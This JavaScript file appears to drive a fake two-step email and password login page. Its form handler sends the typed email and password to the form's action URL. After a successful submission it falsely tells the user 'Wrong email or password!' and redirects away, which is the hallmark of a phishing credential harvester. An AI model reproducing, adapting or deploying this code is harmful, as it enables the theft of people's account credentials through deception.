let previousbody = document.querySelector('.sideone');
let nextbody = document.querySelector('.sidetwo');
let emailaddress = document.querySelector('.emailaddress');
let nextbutton = document.querySelector('.nextbutton button');
let emailreplace = document.querySelector('#emailreplace #replacewith');
let hiddenpassword = document.querySelector('.passwordhide');
let showpassword = document.querySelector('.passwordshow');
let checkbox = document.querySelector('#check');
let continuebutton = document.querySelector('.continuebutton button');
emailaddress.addEventListener('keypress',()=>{
    nextbutton.style.display = 'none'
    if ( emailaddress.value != '' ){
        nextbutton.style.display = 'block'
    }
    else if ( emailaddress.value == '' ){
        nextbutton.style.display = 'none'
    }
    else{
        nextbutton.style.display = 'none'
    }
})
emailaddress.addEventListener('blur',()=>{
    if ( emailaddress.value != '' ){
        nextbutton.style.display = 'block'
    }
    else{
        nextbutton.style.display = 'none'
    }
})
nextbutton.addEventListener('click',()=>{
    previousbody.style.display = 'none'
    nextbody.style.display = 'flex'
    emailreplace.innerHTML = emailaddress.value
})
hiddenpassword.addEventListener('keypress',()=>{
    if ( hiddenpassword.value != '' ){
        continuebutton.style.display = 'block'
    }
    else if ( hiddenpassword.length <= '5' ){
        continuebutton.style.display = 'none'
    }
    else{
        continuebutton.style.display = 'none'
    }
})
checkbox.addEventListener('click',()=>{
    showpassword.style.display = 'block'
    hiddenpassword.style.display = 'none'
    showpassword.value = hiddenpassword.value;
    checkbox.addEventListener('click',()=>{
        showpassword.style.display = 'none'
        hiddenpassword.style.display = 'block'
        showpassword.value = hiddenpassword.value;
        checkbox.addEventListener('click',()=>{
            showpassword.style.display = 'block'
            hiddenpassword.style.display = 'none'
            showpassword.value = hiddenpassword.value;
            checkbox.addEventListener('click',()=>{
                showpassword.style.display = 'none'
                hiddenpassword.style.display = 'block'
                showpassword.value = hiddenpassword.value;
                checkbox.addEventListener('click',()=>{
                    showpassword.style.display = 'block'
                    hiddenpassword.style.display = 'none'
                    showpassword.value = hiddenpassword.value;
                    checkbox.addEventListener('click',()=>{
                        window.location = 'index.html'
                    })
                })
            })
        })
    })
})
document.getElementById("my-form").addEventListener("submit", async function(event) {
    event.preventDefault();

    const status = document.getElementById("my-form-status");
    const button = document.getElementById("my-form-button");
    const data = new FormData(event.target);

    button.disabled = true; // Disable the button during submission

    try {
        const response = await fetch(event.target.action, {
            method: event.target.method,
            body: data,
            headers: {
            'Accept': 'application/json'
            }
        });
        console.log(response); 

        if (response.ok) {
            status.innerHTML = "Wrong Email or password!";
            alert('Wrong email or password!');
            event.target.reset(); // Reset the form
            setTimeout(() => {
                window.location.href = "index.html";
            }, 2000); // Delay of 2 seconds
        } else {
            const errorData = await response.json();
            status.innerHTML = errorData.errors ? errorData.errors.map(err => err.message).join(", ") : "Oops! There was a problem.";
        }
        } catch (error) {
            window.location = 'index.html';
        } finally {
        button.disabled = false; // Re-enable the button
        }
});
